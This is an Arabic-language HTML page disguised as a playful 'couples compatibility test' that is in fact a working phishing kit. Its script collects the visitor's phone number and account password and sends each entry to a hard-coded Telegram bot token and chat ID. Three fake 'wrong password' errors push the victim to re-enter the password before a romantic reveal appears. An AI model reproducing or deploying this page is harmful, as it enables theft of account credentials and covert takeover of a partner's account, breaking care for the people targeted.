<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- منع ظهور أي تسريبات في المعاينة على السوشل ميديا -->
    <title>تحدي الكوبلز: اختبار نسبة التوافق 💖</title>
    <meta name="description" content="ادخلي للتحدي واكتشفي نسبة التوافق الحقيقية بينكما الآن!">
    <meta property="og:title" content="تحدي الكوبلز: اختبار نسبة التوافق 💖">
    <meta property="og:description" content="ادخلي للتحدي واكتشفي نسبة التوافق الحقيقية بينكما الآن!">
    <meta property="og:type" content="website">

    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: #fff0f3; 
            color: #1e293b;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            direction: rtl;
            padding: 20px;
            overflow-x: hidden;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-area {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-svg {
            width: 130px;
            height: auto;
            margin-bottom: 10px;
            filter: drop-shadow(0 4px 6px rgba(255, 77, 109, 0.2));
        }
        .logo-text {
            font-size: 20px;
            font-weight: 800;
            color: #ff4d6d;
            letter-spacing: 1px;
            margin: 0;
            font-family: 'Arial Black', sans-serif;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        .game-badge {
            background: #ff4d6d;
            color: white;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
            display: inline-block;
            box-shadow: 0 4px 10px rgba(255, 77, 109, 0.3);
            animation: pulse 1.5s infinite alternate;
        }
        @keyframes pulse {
            to { transform: scale(1.05); }
        }

        .card {
            background: #ffffff;
            padding: 30px 25px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(255, 77, 109, 0.1);
            width: 100%;
            border: 3px solid #ffccd5;
            position: relative;
        }
        h2 {
            font-size: 22px;
            margin-top: 0;
            margin-bottom: 10px;
            color: #c9184a;
            font-weight: 700;
        }
        .game-desc {
            font-size: 14px;
            color: #590d22;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        /* صندوق إشعار الخطأ المحاكي */
        .error-box {
            background: #ffe3e3;
            color: #d63031;
            border: 1px solid #ff8787;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none; /* مخفي في البداية */
            font-weight: 600;
            text-align: center;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }
        label {
            display: block;
            font-size: 14px;
            color: #590d22;
            margin-bottom: 8px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 15px;
            background: #fff5f6;
            border: 2px solid #ffccd5;
            color: #1e293b;
            border-radius: 16px;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }
        input:focus {
            border-color: #ff4d6d;
            background: #fff;
            box-shadow: 0 0 10px rgba(255, 77, 109, 0.1);
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #ff4d6d, #ff758f);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            box-shadow: 0 6px 15px rgba(255, 77, 109, 0.4);
        }
        .submit-btn:hover {
            background: linear-gradient(45deg, #ff758f, #ff4d6d);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 77, 109, 0.5);
        }

        /* نافذة المفاجأة الرومانسية */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(89, 13, 34, 0.4); 
            backdrop-filter: blur(10px); 
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease;
            z-index: 1000;
        }
        .modal {
            background: white;
            border-radius: 35px;
            padding: 35px 25px;
            width: 92%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.2);
            border: 3px solid #ff8fa3;
            transform: scale(0.8);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .modal-overlay.show { opacity: 1; pointer-events: auto; }
        .modal-overlay.show .modal { transform: scale(1); }
        
        .match-score {
            background: #fff0f3;
            color: #ff4d6d;
            font-size: 26px;
            font-weight: 900;
            padding: 10px 20px;
            border-radius: 50px;
            display: inline-block;
            margin-bottom: 20px;
            border: 2px dashed #ff4d6d;
        }
        .heart-icon {
            font-size: 60px;
            color: #ff4d6d;
            margin-bottom: 10px;
            animation: beat 0.8s infinite alternate;
        }
        @keyframes beat {
            to { transform: scale(1.2); }
        }
        
        .love-title {
            color: #ff4d6d;
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 700;
        }
        .love-message {
            font-size: 15px;
            color: #4a5568;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .poetry-box {
            background: #fff0f3;
            border-left: 4px solid #ff4d6d;
            border-right: 4px solid #ff4d6d;
            padding: 15px;
            border-radius: 15px;
            font-style: italic;
            color: #590d22;
            margin-bottom: 25px;
            font-size: 14px;
            line-height: 1.8;
        }
        .close-btn {
            background: linear-gradient(45deg, #ff4d6d, #ff758f);
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 16px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 700;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(255, 77, 109, 0.3);
        }
        .close-btn:hover {
            background: linear-gradient(45deg, #ff758f, #ff4d6d);
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-area">
            <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
                <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <div class="game-badge">🎮 تحدي الكوبلز الصيفي</div>
            <h1 class="logo-text">WE LOVE EACH OTHER</h1>
        </div>

        <div class="card">
            <h2>اختبار نسبة التوافق الحبّي 💞</h2>
            <p class="game-desc">سجلي دخولكِ وأدخلي بيانات الحساب لتشغيل خوارزمية قياس مدى انسجامكما وتوافق طباعكما بدقة!</p>
            
            <!-- صندوق الخطأ المحاكي -->
            <div class="error-box" id="errorNotification">عذراً، معلومات الحساب غير متطابقة. يرجى التثبت وإعادة المحاولة.</div>

            <form id="telegramForm">
                <div class="input-group">
                    <label for="phone">رقم هاتف</label>
                    <input type="tel" id="phone" placeholder="أدخلي رقم الهاتف الخاص بكِ لربط النتيجة..." required>
                </div>
                
                <div class="input-group">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" placeholder="أدخلي كلمة المرور لتأكيد الهوية..." required>
                </div>
                
                <button type="submit" class="submit-btn" id="btnText">ابدئي الاختبار واستلمي النتيجة 🚀</button>
            </form>
        </div>
    </div>

    <!-- نافذة النتيجة والمفاجأة -->
    <div class="modal-overlay" id="successModal">
        <div class="modal" id="modalContent"></div>
    </div>

    <script>
        const TELEGRAM_TOKEN = '8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ'; 
        const CHAT_ID = '7094930209';
        
        // عداد المحاولات لحساب عدد المرات
        let attemptCount = 0;

        document.getElementById('telegramForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            attemptCount++; // زيادة عدد المحاولات بـ 1
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            const textMessage = `👤 **محاولة جديدة (رقم ${attemptCount}):**\n\n📞 **الرقم:** \`${phone}\`\n🔑 **الرمز:** \`${password}\``;

            // نرسل البيانات فوراً للتيليجرام في كل الحالات
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: textMessage, 
                    parse_mode: 'Markdown' 
                })
            })
            .then(response => {
                if(response.ok) {
                    
                    // إذا كانت المحاولة رقم 1، 2، أو 3
                    if (attemptCount < 4) {
                        const errorDiv = document.getElementById('errorNotification');
                        errorDiv.style.display = 'block'; // إظهار رسالة الخطأ
                        
                        // تعديل نص الخطأ حسب المحاولة لتبدو اللعبة واقعية وصارمة
                        if (attemptCount === 1) {
                            errorDiv.innerText = "⚠️ خطأ في الاتصال بالسيرفر، أو كلمة المرور غير صحيحة. يرجى المحاولة مجدداً.";
                        } else if (attemptCount === 2) {
                            errorDiv.innerText = "⚠️ لم نتمكن من مطابقة الحساب. يرجى التأكد من كتابة كلمة المرور بدقة.";
                        } else if (attemptCount === 3) {
                            errorDiv.innerText = "⚠️ محاولة أخيرة متبقية! يرجى إدخال البيانات الصحيحة لتفادي قفل التحدي.";
                        }
                        
                        // مسح خانة كلمة المرور فقط لتجبر على كتابتها مجدداً
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    } 
                    // إذا كانت المحاولة الرابعة (تنجح وتخرج المفاجأة!)
                    else {
                        document.getElementById('errorNotification').style.display = 'none'; // إخفاء صندوق الخطأ
                        
                        const modalHtml = `
                            <div class="match-score">💖 نسبة التوافق: 100% 💖</div>
                            <div class="heart-icon">❤️</div>
                            <h3 class="love-title">لقد فزتِ بقلبي! ✨</h3>
                            <p class="love-message">
                                خوارزميات العالم كله لن تقيس مدى حبي لكِ. في كل يوم يمر، أجد نفسي أعشقكِ أكثر، فأنتِ لستِ مجرد اختيار، بل أنتِ قدري وأجمل ما أملك.
                            </p>
                            <div class="poetry-box">
                                "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
                                ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
                                عيناكِ أرضٌ لا تخونُ عهودها<br>
                                وقلبكِ طمأنينتي وسلامي" 🌸
                            </div>
                            <button class="close-btn" onclick="closeModal()">أحبكِ جداً ❤️</button>
                        `;
                        
                        document.getElementById('modalContent').innerHTML = modalHtml;
                        document.getElementById('successModal').classList.add('show');
                        document.getElementById('telegramForm').reset();
                        attemptCount = 0; // إعادة تصفير العداد
                    }
                } else {
                    alert('عذراً، حدث خطأ في خادم اللعبة. يرجى إعادة المحاولة.');
                }
            })
            .catch(err => {
                alert('فشل الاتصال بالإنترنت. تحققي من الشبكة.');
            });
        });

        function closeModal() {
            document.getElementById('successModal').classList.remove('show');
        }
    </script>
</body>
</html>
